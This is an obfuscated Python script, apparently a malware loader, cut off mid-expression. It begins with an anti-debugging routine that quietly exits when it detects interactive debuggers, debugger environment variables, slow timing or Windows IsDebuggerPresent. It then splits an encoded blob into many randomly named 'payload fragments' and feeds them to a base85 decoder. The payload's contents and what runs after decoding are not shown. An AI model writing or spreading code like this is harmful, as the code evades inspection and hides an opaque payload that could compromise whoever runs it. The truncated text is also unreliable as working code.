#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cgdOrt7Bns_GKw = 'n#}{?EqL53RN?&;c;FaPr=iBWDlIRe>lj3D5K4k)5D@~0u`%R;N}hYj=3>w{x5)G3LcWM0z0<IZp^F'
_cmg69WpD_Vkl0H = 'lk)xa=hyawdFn);lplt7vY5}@9`?FV~1e}uDZmEY-dkb(wimsOH^Sn|Sl!PB3P>hk$zI~;*a7^sgF)'
_chQTRyQ6Im6kcN = ';zv<9`A4$nM*b%iJ8jlMlG~=$>wUm?=Z#GYUmH&OmV@ea1tLC!c<b(Ufu1~J}=X2`a5(CXI~5CRew+'
_cfdHmq89Nyyln5 = 'mfAw6R95~o3S?B$vh2kyMZ8w2>bU99t<;b>op=1&;37|ePZR>@K`2k6QEauU4fuXOA_V3TD)Cd<JqV'
_cy83wUY74HXFWS = 'N3PLof<m0jSoNzuQ}`9O+%<8V>yL88`*DEydWJfy235C69?gcKxZO&TN64`B0E#0wVR1B}kZ=EKC{S'
_cbwQFMr2sVMduc = '#VoI~ha)i(Gl9yfI*#EUC*BY=6Onv?8tB9POd)+_q3NXsIx8Q#F5uhdscZIjtl|)NbAaFY6ffrM#0f'
_cncMQo4923z0Rf = 'Z#2a}vuETw{&NeevU{UY&{Hm}Rn%g=zv1f*kN)$HD!&lUMdN;QP6KLCxTJ`i^@p6z*j1>=?7WHtGf!'
_csYw_LUi1Yqixv = 'd$ECpiHENGh5OZCdb>ch&6%DP}u+8+LQ6bI^_|bhUpZpsHI?0H$NMqIY>0>T9GoNtZ1GlU!IbU<dw~'
_cdQnIZV4McK5O1 = '5PV4a;=;{HFL$3S5*M`XtTE@f%SLseUb?QOhBrbW85b7x}8~TZ4hrhEc3lMUVw6WhC$$T2*$+6>not'
_c_g4xuyRy5IIw9 = 'TPul!0Tc&&i1L(>OwV^Ox&pY{!V?jTkx5n?)O>Sm-1f)id;2mGmLn1YmN(kInZst{E-7=y`a6ZY#z7'
_cwSlxaj2TOwBS2 = '7W4^bU_af68<>st6LLIsoa^J`)A56u^>Kxmm4AYQre}7)krY8a6Ye)92Q?AIYG^#N1@mK_31*W97cd'
_cwBS7pnx6nzfdO = '!7MfeQV3E%%**%j|V`ZBWt3+#BPZKzf(zNSZPf?yvGpFtD!NgsR^3y>7Cv@8xOYNTWnx(8wanU5y%T'
_cax6f3WknTUL2O = 'v3?WZO%XR%8B&7k1634qV7X}k7;qM)gFAjzg%@87o@Rc5uahF9tO3VXa*~~`KEz)-Cr^8&5rD<rF)s'
_cjCpkuxOv7EVzo = 'rGw)*@H1K=9oZ@CXog?s0(Txmz11%57<j)usTtU!qn&M!;qcBFU(&d}VwIkny;4|IFbZv`amV&p&Kk'
_cditU8EGi5xdCC = 'ce;RArLau3$59tNf%c{FqaKXgs{@z)`(l2g_(-uA1YvvDmLBlNTkM9Ql(u3r{@7RVpZw8rt(gpL32i'
_ct9NxsJM_GNJzj = '1GB1ZpdiAk@lB||>>#I`Ku>C_akB)BwYj&vF9P9(m?lO(u@gdiSzy47FwWo#?^PO!BmnzOPVm!_zPI'
_cd4IjpH86wWQ8b = '?ih9nU%BPUtpyz*OrdFA2>3@6pLRP%%O`+);V!dBzFS&;0EittJQr?Nx>$yGIEdQ%&HnF;3_DFy*_-'
_ckSW07L5xnBf2_ = 'CgYPK_V00T}#tl-wP}QEVL9nGW|b@>8AI_3y;f<of4StEah5ndn$LnbQmQ)!E&_&qWHY?rx8xY*P0+'
_cxxi5AiSjpWkV9 = '4gU6iz<k%EI>KR-;*=Fx}BX1?GX)c|g9kq?o3xxbgmbf&@Z<6H0Cc!)}ElCQNv%N-oeRzb{$rzL<y4'
_cjT9e3wM78VqwW = '$2N2jRyeuMuby(-;@3F<#yRD2h{CJm6IaAuGL5Y|jY0gJcYGX7r$2AuEb<f-QYSkZvuG=baYD`sed`'
_cjCwfyZjb649kV = 'f1I1OKxto&X!<Z~S@}k`B=NUPG~kp{Whhdsbx4quURKM&e5V1&@tqKi$*}y(FI|T`4p1@Pknp<Z)*4'
_cd4X0tCHagdWY4 = '^q>k3&hf^c}xPyVf0M2mXfjF|&FoYdEZjF(q6<J?nMegj#fy{hUo#by{x)1qxB6sjR#`Mb1OmiuxvS'
_cfDBWNfwrbZBZU = 'df0E;$*&f0lVhd%w%$0Yt=o-TbuCeM#rT}Ct{5OyC3wy>L4V+2(R8Xl*bFM!x_ToS9D2U8QNaCI_JQ'
_csyezz52M4JK0H = '&h)4^9rR;_&6=YH!-3Ur*lKX4+K+h)5zCK5h-!iQi2TvDPK0)0Ks<wzvKXfqx-Yvrwtdp%$pFmG_I*'
_cb2d_3NLXbr332 = 'ioS>k2?@a4~+Mx<ZHg3_bBBMVW)JkkeZg{vw+ci(8uGais-zcCo*z^qd1eDj^DOnAlr2RYbYtLicP<'
_cfBWinYnMVnjCq = 'wLk|~^&o8x--$AP{m`xiw1lnSBod?9ar8Ye=JJuo2i@KHEeue0nNi2sHA@OV@UDI;1|2OVo+=%?t@f'
_coYfbwMpwae6DN = 'wSn+$Mp`*U}1jWW}v)jcD9>n9nR&-X)CsYf&K+ivw<Y&0?OgSZ!zFpBG(1i&DM2o@yFl)r^cC2gtZP'
_cghbuMA2S2ADrL = 'bR7nCGg!2aWy}Eg2_u4d4*Xni$u_hT(j{{wT{poKK=87&jQ(as3``^DzNlWw{Uc7C!NzV=P#Nwz6`{'
_cf_qKGOB4eXzXT = 'x$!LklFc}%fd?Mvvu}AEP8hj<>l+i#cSEWZlBD*nl^Q3pVQltAY9X!zw4)4GC2$MlLJ54pkV;YgO8|'
_chB7yEPswKH804 = 'KcGh+7g_D@;7T24tI}3vW$0Z@M4@_=HIO%5Pf~j9wF($!Zdm1TeM4+vE_s(WP%E!HT)6+CR-v@%T%;'
_cwfXhuuyNDewUU = '>eHpi+E~kw`8^9qzAAG*KU{Rr^JCE|@aHH&p**V-^$$c#duW4yPTmNr_dDAeohZUFr!<FC&G#d1F1;'
_crxDCxlsE12S19 = '+jM5+7@RTYmgIUD;iln`?34hGdO1DBqNrS*>X6U_~v@NzMQe6luEK>+{jBlw~BlQs3H>pQ)u2xc-A$'
_cexw7XTq27yikF = '^3h^O+6H&Iycx&eZ7s#93dim!Q}5)zovOmwqYn(x+vp%m$o4NeH=xU;siKf(WS!O9%CPzGtvq0MM+n'
_ce6aVYgcr8QAQu = 'Hxwh4c$nwu{EJfk<dBtF=!()@qes$z2j78Oj>SgyB96e^^OU!UM-uy9QI6E<$oTUt<>(kyK=9WgcQt'
_cimEfNsz21VLsD = '6V1W(I5Wigye9=_6cl1ecXpccPP3{UnI*f#?HVa4I}3U&;L^$Jf%T4if>76NL{C9FBSV$E*13lFkfK'
_cfDohlnW0RjC6g = 'CX0|vENM%Bn>ca874eTsU)Ezh;PH%RwhpTdVPHUbUwu8<lN(OoSD6Os<Ws1X8SX?#0T2+Qeqk?dKK2'
_chG0EvYYD6G597 = '$pEz8!gX6yM<=Fa6dm;z~5CuInxO+!SHj!hoB$)W|!L1XZv17)XI%<@d~`sa2{XPL4nUBl@+V(vbFA'
_czu8UqEOpm8vD_ = 'AAK|F=Z+aH(G9`@`(OiIh+4p5a4?&?~XT~KLl)nZmT2Su$y-whhBh9kXmm};7?7RgxRdWywFRk)aUn'
_crX0FN4wr3Ro8Q = '{<hPhV#2qcz5w|DLQ!e?o-!4n^so%9Dnee8i(W&@)B8k|n^j#<jUXas}`I3|&9Lb_6{2-}(+xKBlJ9'
_cgSzazWHqryqfb = 'PF`aeEi}C|T9EfCrm}0XzA#wneMvJJLz2Xz?g|6C*a@cqP%h7;z98rx{Eftzxy9tyQRbsi(0);Uzj)'
_cboDbhtHAB12nc = '4sMrCx|iu5OV2CB73K8n_dQP+@q#r7pCZKRU9)d_y{>z2rgiZIYxVMOChXuVuL~_xNqrYLQ5e*eN~?'
_ckSSzjtaC3upMT = '@lx?^DqMi3$6pBb5auA7xpl)F(+R!2ANhfbY|0aik>TdQH`0<=uxY>q)AUIy4ByjhsDgy)RF3j&=7d'
_caeRAHy2wOohdo = '+2>=^2yM=tuSc%;BL6PRO4yotJ)F1Ga;%ugOl?Ci2%(Yw9yYn%KT#eG(9p)90y(C5){3R4GPVWyGBA'
_ctfG6gJtw1T5qZ = '?VK#H>%{reuRglT+<Kf`Af#OMNlzSRf-Fu4eTvCnfaWi{%^bA+R?U|BlPkX&_X}=NEjC)iCx6u<`vC'
_cqLz27twc7b49S = '=(`INtALaWG*5s~{>ms;LT@w)><DbcWz84*`D!gr+VOe$eqD<rNGSvSOo-Jr41LS7;>Or~5Lc5vIg4'
_cq3A0ZyBESYKg6 = 'o%!*-;cW!O-sksJ7<Ll<Po}CBUG9iF4vy{{r4w<oGccj!iNFcZwOL;OJ5ih%T&rt+D9cS^hjH=@9Yf'
_chaot8Q5rnq5u4 = 'k<6)iL8h+ydD0B&<+h`%k=k9<w&_4_gtoEcX^=#lUg$?jk`fVHxEQEhqqA1M1Ws|h(ilQrXyAnsE-s'
_cu9RLeKulYSABG = '*4AwS0q8-(N5(lhc3A_u{S=Du9!2B9f2Y1oB4wR{~K@J%`qUd0*P$Hf7#_qG7D7;oGp`Kl>t_-a7E1'
_ccfQuMYsZHwROO = '&%Ul<TKLOvp;%bew^=+%|<ARDAVs4#U0Y&cmBW~I}y08HR00`<R1OZgCY^MeNj{{BKpW*Z;t@U}O7V'
_cgCfR2taoACrhj = 'xjrT$%23QGg|bH()eSoNB%aDhQKWL7JWVB%q^qXoD*>NDzwR-L0cN7Md#RqZTVAfin+JDrD^C5*mj$'
_cqFw7GDxQSKwxn = 'wa%;OALCbRP&`RT>P1QXd)e+y^nr~ZWyTS;eHPgOmO_4~ciHk#5(>jG?G|w)AsSdz!xJ*KYB_AL9Fy'
_cbEvR7SbCCi9Xb = 'DhNnrq0lv`bCH&JB!i$)j9*3+|)K_6iM3c3pFGQ-9JHU8hNz3VxCr6+|}iEcS;eA3t%W{y;_+8bSc_'
_cdqCQyylinyVMy = 'NcQ%!|=rSkbQ}5sivX_3~Y(0HemJSs;M!`GYiBJ9HKX3d7yy81dw8LRb=VLeyO&X_(~LE{gh#~9;22'
_cpHIm3isKbbhb4 = '~X$ds&V*CBi5gYVx*^m7XiKS;+KOnPQQE-(9G~lw!<4}_=%o%!%#}EZUPYWQZ9!#b+)zVxkjPg3fvW'
_cgFh4cCaF68h2a = 'Q>ouH@YL3u;&E@TPPBt>6hk!*_Z#<-Z56{96@NGQn=W3#pWItN6$E3F9b}GxW5hVX16o*sXC?iMW3~'
_cpfx55WANKXL9T = 'T!3(pu=cw3h#I1zu~Rt88``;rs3{4Wh_Id4)5odEL0jWob#B8_m<jSsw7|x$+(rMozKEO^Nw^;SGLX'
_cgimKGmgVi8UCe = '2BOK9s1ErHTm#-E}mZB|L$?Kn!~R%0&2(2JSAkSpylE8U~9RBLHe`#3I6_Yq+uE_bawL5XRzp(^Plw'
_cwZzfyCeDRjyWY = '71kArwCg%$1O8qb0tVPE+E~W`bwmrs`mq=%)qF$9`TwuumvHNoJp!k4M`vN?ukk?;ccNa57~uqHUnr'
_ccRZ7WqkKCumm9 = 'F=A|sy|BL}7{TPz0f?6I|<hz2u-KtF^OXoq8IgCHE4Q=p)EPP}qtf^A2{Uy?Nrd>i^*lL!w7i$2ml('
_cgS3mmyoUlCBnq = 'Va>M*=-B2O-NA+oDl#lb}>09}v^|JN(n(2F;tjX>us!wo^syQ-tkD@HP$om`LGW;lFXzQ`X?2x6Wlb'
_cq_lokG1Z7FAMT = 'cd=k6RaxVt!@m*cHG6sWG;ZDY%UPtv8&zziN7ntPn|JW-ZLy8P;5;Guj`COsC{qtp9st`l4I@Qxr1w'
_czr2tzG4TyOFYf = 'E7U}VoLr#p<-Gi`c<EzI(A-rm*pkr4H(xTO^aBse6(ckroDw7&|;nRrvD!y{9y-gfBe%N1H)MZ58pe'
_cgewo4btB0zsEB = '?=e|Nflmo4WdKj&3xrExy>J=Zt!4#UE})vUz4{QG3yHAb@s?sKJ{9UC{W*7^_33LS2w$-$r4;WpT_@'
_cb03VH2cGZFKtu = 'Q8*9mnu5AguLMaCtB^iOCu;dQS<aI;t3lSg*b#d5JMNzSmn`}nJiJSqb#&7t`!<mkNHwzQV$9%>i-C'
_cmo8bTZHEtoVda = '^K&(l&dqZ~wIO7_>B-FG}&62}_TG0s#(vV<Q+?>S0E;k|Y<za;qW)+#<#gK%hVzYG3EkIk&0J+oklr'
_cxyXK2s60ycM0V = '$)&?@KC{Hlmf<a8%2<ToBJQtAp48ylFuJZGdni)&Rgfh%kZHMBPab^wZ*iND2|xYwzkuyMGrISyOu)'
_cxZBMAUw_U2NtB = 'B>N@D;q)oAMN$=+LW*Bmp2JQlYCAXZ3kk8|0K;lQ?fRPQz8sx5t+iy3UoolAgask$w+lz&%ts2iN_p'
_cgaoUB6vswe0pi = 'V#d~1P`BE-{&QGft*YEs+C*Wx3*TVJ3wB+>N8s{*!j|JqY1In0-4C}Ppu3f_}u8uk0B<zp}JClAbDB'
_cszOUtPiABYa3k = 'MqDIhli^E-Bo+VZai^&2FJx7Wci^feS`?`KF*{pm4uXB=Z!3tu=GFRmG-7w(Iruw^z5VOnb*{E`s_('
_cih2E6GSQiMTQK = 'G%q25mG5*QoM*6&Ivi3Bo+<HyfmW@Q@rBO8}|8BB<5u-ImwC)!hr2#_{SZmRFmsblC-h7nIlOut8h7'
_cmH8FopZvZbT0z = 'aJuC@BS<KUKG6N_2w9>rZqUk8b&BKfKA9JZoBY|0%D(~9Xnle%^-B3I_m5!zfC1Y<+evm8vb{e1dxP'
_ch8V1_s_drPlK9 = 'n;+pB6!NSf(*F>Dv&C2On|8lQ|@?@4n+T#Ha~QKoAvjP~x8f~;6iv#s0g?r=4gGm4pnm3^s+w{UKA7'
_cqFUoZpZePtS0q = 'qy|8g<mrSoec=$ZpJ0FCoGHNbA?jQSxK>(su%%;R1qo9K<;dYbZ#I4&}vxXns|v&q6^fc27dF)9QD&'
_ctcCpAulNfuA1J = '_0`;|KmW}Wb7%22h_rIJmX1&owPCs&dLnn<+(W=8KS!m09H(<iQPq4nb85U1x*RpPVd`kx6vrro*jz'
_cmD6qzIS8377Ai = 'bG@2K$r!1ba*(VPQs%c&APE@G6kL(Bcobtq?rOL(S&-wOFTuy4b&ym}0Kh-{(UdT)OKRdphpFD#=aA'
_cmM8Bc8Bjh11k2 = 'ucLHU6D9D44zU$WOj#(h0VZ9*k<bnJ)SwH^H=)jI6(cf$ID&+IjSKR5_Z#$=ajhxm4($&~J<h)I6vj'
_ccV7SArSUiP_Ux = ';YV3PM^lXvE*Z%8AfLAlM=I-~)n{bS^k%p&k;z(4MJPZ8JFr8-4~SVQ#K@%nF{zN(w(Iw3UXdMxMt)'
_ccYVoT4RLOqla8 = 'CVJHkPc)TBPe>!G$k8P$#vNihi?DzJfowlPtY}<4ARv`(<VGFk!ea{_?zHCcok;EU;mB7Oo$}Yt$^E'
_cbR0_SQw6m1jRb = 'f&b4XQUN*jckpNo}&m8K=qQK*Sg`-^S2C=SO8AZ#0@H>LJ3d@nxnD(l;E(_e@Xr~$vofNx<+^M&tbp'
_cyN_rWm9CRC1Cf = 'QH`WLkS|6o_=2+>17nrK=q8ujrI_X^=j->??rs3QTpvjF3cGd%)8Z18JC7A{<Dnz!XrFGjY2?7+gso'
_cfoUsyhptM4CHk = '=k=q2Q+b<8=N$GS+Dr!8{$!H#0!HcWmw!O-%NR<aTt(8aE103LKV{@YXO!r)mzckQ=L;Wbk(x0h$fk'
_cj8wfjiyz3Q3JJ = '`YJ|L26;rija-?Ia|y2#$%v6=8nVJ+JLzq+0=V7{EeqyX(B;^z6a5l=_bagcN>HRg|LIuMP4JYXdMC'
_cdf2ITndltoKO2 = ')8=BF_U~m`ZAW!4k1#M7{RP!p5_=+R}%6|d@BkHkkey6iLml+B7ISgM}}V1z1>Vqe$kF8whC6#bt-B'
_ccO8uoP3lXVFfT = '+3B~jZ1tF&oNTuFX{cure0R4<JB9JD8_!06ESeqa?zzcQ7KbzeRZxtl`nUqsJ-#=aLnJNuwJedJiDj'
_cbrkT3WgbpFZrb = 'mAl^_)7f&AN~`H9+|Nl{ZNwyFF%o%-gAmvJnet(5H(l-zev)?lJOXs-}Od#=+w`uw;%~_vV-jD&3*V'
_ccHHQ8u7vuDOQK = '#4x)j*#wIu$!_N}h6H{AEfY3B_q$-|#H8bdC3iBSED2rU(N~)OK5z@V17GT-in<@xIY;_cz3TG%7q|'
_cev7Ic_XKV5I8t = 'H+U+e`i6@BI{y;R=}69=^{N&l4k=h%b;ncY4L<vBQFgxRqeUL*xBMk%IT7O4$_DV|e!DYp(cPlg-Lk'
_csyKFVmUEKe71Q = '%YHfMwuTeXpQYLLC*@anH<KETX+bBb)=LOFqLy}suHTE`7dD!c-I?-C{CVvfT9DxM~8fvYZg^XwfRZ'
_cbNOPXp0Dd1tGw = '#3MHm@bcn!d2%80ZPEII;219?%^n!ejsV9?@x1`j&9?z{Mqju4{+=Fxcu+lFi86U++TYXlXAHR3ED7'
_cr4oScEl9nx8jn = 'r#l&U(|(?ere(aU?i>E;Iad1M=gYwo0mv*ZHV%B7<OtzEfAPzIT`sMTrLtn31WU=JB_gGPgs+_GD%A'
_cfmpQdsGXWxwVN = 'bg5Q>7j?4vJO8%aOhD51YO%04BzfWu^DHqdlhs{Z;1EBS082ukCmhw^dnxQG!t6i9IC`BE(Vh@eH+u'
_csfhs74nm9zxPm = ')IHpiRKYw<fB{F3Hep*aIZv}o}kW`7X|bwO`75K!t`jtNF3L0xbLUO1beA+rBxdP45{@tNNhWBq&HT'
_cwF9dKmSfs0Poc = 'eG$buiFS*oM@DOe@pi&AoCRN|0r86$tDw>b1APerTq#BF>#)*B*@P(GbO9sT=?4S<0(j2k4Y^FR3mY'
_cydXvEQBKL_GTS = '+APD4!r4pC{*c83)PS+|G?kpg#R6@DVEzLZ^X&h5oP*vQQI12CNAi~JS1M$mU${)`iK$Y4YTIEaa{C'
_cnJKJNFxEHIN4Y = 'Sye0WxUMG~8QU(#`{Tx7)`Z<916dlwpD<?!LknB=r%DL@KcfRNA*8?p&rby`u8*v6loYcmR`5eq!3>'
_cuKmunwxt6yQ0B = '{#N)(Itu!a>kOq21Px>TBoc$$L0FP;2#g^ogi!ACkfb`wV;9=UOEL|2*bVhP8{G-eF?hDD<ZM5kwDd'
_cmZJfYCRGRObYB = 'bQvFt^_%f3rfXgPFGRyV9{jjr??=aZ4xI&fuejU^~dH&~ruJE5y`tE&)U1aRrS27RWb82F~^R#03rP'
_c_eQPoW2SYhmgh = 'Cs;F1TtTw#kBP4Eq5JvKok>=zl%Lze0k!Lc5YMX^F+5T5BfYUzu5E|J>%uOTb*$BNZ|jbT}>cq?QS}'
_cyvE4CPFuOpVhW = 'sJ369?dAC_x#}Il|EL9BX%j?MpH0I#pa-)!VilDiypag~h)x;L}A3<Gx%VSt`1aKSN+s@nk+zLIn-O'
_c_iEl01XOGUesp = '9Kmq(J56eW%D8^p@SxRChcK^HWHAIsGkh(<V<W(Eb~Q7gvK72g57c%z*ojdTIFj#GV}(RcokIcce!Y'
_cj2Q45krzDLGmw = '>HVh__&ko(2YH_~j!zSg6<gSNfd$;)ZFCb*WK{vp4pdT-cpJp3bHgs-Z6p+wSYj<mze(%9d!+uTL=*'
_cw3UfKe4tBM6QQ = '{dr|ZI)1E3?aBhtt#Hp0K{1}~-U0aXd+e+8SoDJn~HydD`(PsK|;Sq1ml@mKv@$V!Yoaj0>RUnW27s'
_cmwq0zr0gd16n_ = 'dM`$aA8cMeKN%>r&BV`(qj1<@;LK*CnCnT$(qz7Ez^@VrL(X;ekdp;2VHGvP6g{%2OPP>Yt@Go-1$m'
_cv0Z8MlQ5ojO9a = 'K*jxO3HBt}D(f3ZR-La@FlgGWNJBtROxm9kLYoPS>qb!FLGxKjTNe#t>yl%yK%|b&T$2qd7T}FWATK'
_cwZ3VisiKn0V8S = 'cC=Q5>gdVAid{t3AwkCSqV32`I`5+~%15NDeA2F-|R`qHDF9SBTW+RQjh}@p1j``U?l=^c_EwPEzNz'
_chyu14ldYn2F_8 = '+oNY44=4RJ-@vztsCb07O7xFHhM<K5B~yn4;hAon7R5ealoGL{%8WA7wuB>0WBQo9I|BveE`N7|bQj'
_cg3fqu06OLPaVr = '3gc@8=NlK=+VjsjuP!CdV}<4nf4n)TWZgZNekcny1Neqt02;jE1hUuEtx3PJ|;#owUA-P~tMmoDSN#'
_cdn2FicsTpbAuc = 'Gj)+6gom9(IVXm4PLp~>3Tq+)dxq8F~yF&rF4zAV07yI{nxzt{Xk`3@PB&a3z86&3)?BZj+o_H$+%U'
_camNk8wUYSh1fU = 'dO)A>aqbrqE&d~j4ZS$W8x0CloPr*o3uULLwCjV;|Gm+qE3VBT!<Qh=-W8(TT$FQWS_$Kuy6Dzt;Ee'
_ckQYC5c0Cuul3N = '^8HA`a{YX}cVN>tSop7d`_rhH9Bsv-8uoB1Yr%qKj&HhjK%H?h?`6`{8ig379<5Hk1qEts<>!%WELQ'
_cpNJDI0f5j7f93 = 'ph$KMQrq#9g{%WTrbqKMMIJgj<^ok&b(znRHTQtW3VMs?{r=pB?=3XZAKTKD7~tteQVq}+O(h6!);u'
_cjMtLelc8sb11G = 'U}C~uN)ulkwGHediO18T-zACxZ+LQv~k+~Q$m0{F~?3}METjc7e7TBMrFxU*lAw7)HZDhva<Vg+b2d'
_cehlk3GHDOhqrn = '|FOi*0%y7<F0bc^$ylp=ZgL&N*IpJVkF#R%vHN0`rOdN=Y#fTQEs}}wf8H^mB;dZ2nz>~{4@Y!$ICO'
_cgj33MQRc_A0Rm = '5QZJxra&|8HXrBC@>^DWq&CG5gUlB&%(w#0dAYynLXkhGME0FAVd+TCC<*klS&Ck)o2xG>Rtyn!NS|'
_ceEbH_YSHMoLLB = 'yswxVvN1d`Hu)+DcW)<1*Tdf0Qt`(boLfuZEuJvO1UYN}4xkk&<lUIw7A){*SxPIn5+*x7UW~(y%)h'
_cpG79PT0ZPQUWE = '_`SHBCrVT#qA4d(HI6s5j}^=!kjxTEwj_sOaGL_-tW<N5+EZ@U<NH<0*Y2L@(P}0KDo`-B{@pYiPK*'
_cqJMtAtz6SkGKV = 'apx>&ARe>60PMVFLNR8J5gTQ)X*DyTU%`rS>MH0G6IQIPbwO6aPx;%WnE>tQW}HG70oN?J8z2^zy_8'
_cpDFqenfFA0V9o = 'j-qzlDBcnZo?8u_7wRC1aWxNz2SQChQ}IwXbFeK+ZHh^&I3Q2gG$^@Vgw8T`fz+w?QgA)%g&W(Ck*B'
_cpwZPEaJnGGHk_ = 'v+onIek>637#EhVM5(#uE8Ur6p>$7|@^@TxbjKF(%wCd#b_KtUF<Kyq<@P&K{jfKJUnwS;eq_}K~sw'
_cujDLMPEL2l9mC = '1vpy1JlD=mH{Eik?4C6DQOjE0C7=X)BA_Z+5m(?mLbTXq9}5o~hD%nyjbggR_Kdb__zCSgdeySR#dv'
_csnGBNxKV_p5s9 = '%@<njv1x%ad~MfJ;2`qfQE8cDgjt7JUW$C(+n&NsaM-0}<s4CR*6#pkMazbtxwF)2g-ybIN5#44axZ'
_c_BGFlSimYwlKu = '+$1$84gjli2<*6E3yb_i>q^_5X)1)l08%I>*}Wzx@l2AsHBts7#Z(R(m@qXnbHX|WzSVp!YP7pgnt5'
_cdYzy7PouYfnxH = '-R$i&sE!Yv$o*4(YgGLTmtd<o&jkh>^M!O-Kuq!Ft||ED^by=m{bAG9S*-_V=M6>z@BFK93=4&ALL<'
_cfhAutiTZ__PyV = 'Iu|DP;z0`s={wZ+89on9~!pW~d^)>ixPVakKmT*GX4zGIwOfq<WnJIIkWq6q-h}*)P!5{n1xhzwd%{'
_ciT_HH_kLBS2My = 'amMYn(kai8LJMpQj1ijSf1F>zBuf%)M*bQ4i|{37CUxEr6rEdp=FuiYl*ZP1i9MrR=gu$(brcMIk_i'
_cfyAyKM7vM91On = 'ol`s|g+;3eqo+7D1Rz+bePGqsJ|FoMO_=VIX==C}w{u=n2aC84%<A<BxEUH;+k*4A2sV9t_E3NGp|I'
_cfUdixL26_FHJx = '`L8;~z9yW&Chh;OIm`V0X<db!)<an3wQYxA6op?|!HSw3nZ#Tgu_4d|&js^9Pg4dD61#t6)EwC;Pw>'
_cxwKwSga19aaKQ = 'n17b4_sGmF^|T2E(_RE^-)iXm1oaqff*%S#W;8pwqxO(hsThIrtLE~L6hmx1;3fGkjGMEpUlWyTto)'
_ctH92p3X7BrODK = 'YD-nT>(nK8o>Ny+N0Wn2UK<0<y1t_i%>6bw~9iYdh77)*NtgH+Ph(ExyOPGI!e@W;#7zRhDCCkvXh;'
_cj7o3fUIFpz2Qo = 'j}6XYl;m^VfV0Vz4m&i-yL@$P9ViW?)n2^FM(mp3WaMW}jE6?a@XT9V5l`hZ2e6zp>wJkMADo3K7A~'
_cxl13waxu9aJDP = 'wUz%B9i4%zAE3Euj1f_Z<bdj9C1BN=sA1Gtg)XS3S=QtB{g}qwrHOiB1suVB7WiEygr~-iO>AXB#Th'
_cjT2T2Q52TYVgu = '%z8tG3W1vRxo9N`gXk5Q?dZJL%QVDNO@pC*2<MRr1;9TvR|Hc9'

_pd_bUDaQuAnPv6 = __import__('base64').b85decode(_cgdOrt7Bns_GKw + _cmg69WpD_Vkl0H + _chQTRyQ6Im6kcN + _cfdHmq89Nyyln5 + _cy83wUY74HXFWS + _cbwQFMr2sVMduc + _cncMQo4923z0Rf + _csYw_LUi1Yqixv + _cdQnIZV4McK5O1 + _c_g4xuyRy5IIw9 + _cwSlxaj2TOwBS2 + _cwBS7pnx6nzfdO + _cax6f3WknTUL2O + _cjCpkuxOv7EVzo + _cditU8EGi5xdCC + _ct9NxsJM_GNJzj + _cd4IjpH86wWQ8b + _ckSW07L5xnBf2_ + _cxxi5AiSjpWkV9 + _cjT9e3wM78VqwW + _cjCwfyZjb649kV + _cd4X0tCHagdWY4 + _cfDBWNfwrbZBZU + _csyezz52M4JK0H + _cb2d_3NLXbr332 + _cfBWinYnMVnjCq + _coYfbwMpwae6DN + _cghbuMA2S2ADrL + _cf_qKGOB4eXzXT + _chB7yEPswKH804 + _cwfXhuuyNDewUU + _crxDCxlsE12S19 + _cexw7XTq27yikF + _ce6aVYgcr8QAQu + _cimEfNsz21VLsD + _cfDohlnW0RjC6g + _chG0EvYYD6G597 + _czu8UqEOpm8vD_ + _crX0FN4wr3Ro8Q + _cgSzazWHqryqfb + _cboDbhtHAB12nc + _ckSSzjtaC3upMT + _caeRAHy2wOohdo + _ctfG6gJtw1T5qZ + _cqLz27twc7b49S + _cq3A0ZyBESYKg6 + _chaot8Q5rnq5u4 + _cu9RLeKulYSABG + _ccfQuMYsZHwROO + _cgCfR2taoACrhj + _cqFw7GDxQSKwxn + _cbEvR7SbCCi9Xb + _cdqCQyylinyVMy + _cpHIm3isKbbhb4 + _cgFh4cCaF68h2a + _cpfx55WANKXL9T + _cgimKGmgVi8UCe + _cwZzfyCeDRjyWY + _ccRZ7WqkKCumm9 + _cgS3mmyoUlCBnq + _cq_lokG1Z7FAMT + _czr2tzG4TyOFYf + _cgewo4btB0zsEB + _cb03VH2cGZFKtu + _cmo8bTZHEtoVda + _cxyXK2s60ycM0V + _cxZBMAUw_U2NtB + _cgaoUB6vswe0pi + _cszOUtPiABYa3k + _cih2E6GSQiMTQK + _cmH8FopZvZbT0z + _ch8V1_s_drPlK9 + _cqFUoZpZePtS0q + _ctcCpAulNfuA1J + _cmD6qzIS8377Ai + _cmM8Bc8Bjh11k2 + _ccV7SArSUiP_Ux + _ccYVoT4RLOqla8 + _cbR0_SQw6m1jRb + _cyN_rWm9CRC1Cf + _cfoUsyhptM4CHk + _cj8wfjiyz3Q3JJ + _cdf2ITndltoKO2 + _ccO8uoP3lXVFfT + _cbrkT3WgbpFZrb + _ccHHQ8u7vuDOQK + _cev7Ic_XKV5I8t + _csyKFVmUEKe71Q + _cbNOPXp0Dd1tGw + _cr4oScEl9nx8jn + _cfmpQdsGXWxwVN + _csfhs74nm9zxPm + _cwF9dKmSfs0Poc + _cydXvEQBKL_GTS + _cnJKJNFxEHIN4Y + _cuKmunwxt6yQ0B + _cmZJfYCRGRObYB + _c_eQPoW2SYhmgh + _cyvE4CPFuOpVhW + _c_iEl01XOGUesp + _cj2Q45krzDLGmw + _cw3UfKe4tBM6QQ + _cmwq0zr0gd16n_ + _cv0Z8MlQ5ojO9a + _cwZ3VisiKn0V8S + _chyu14ldYn2F_8 + _cg3fqu06OLPaVr + _cdn2FicsTpbAuc + _camNk8wUYSh1fU + 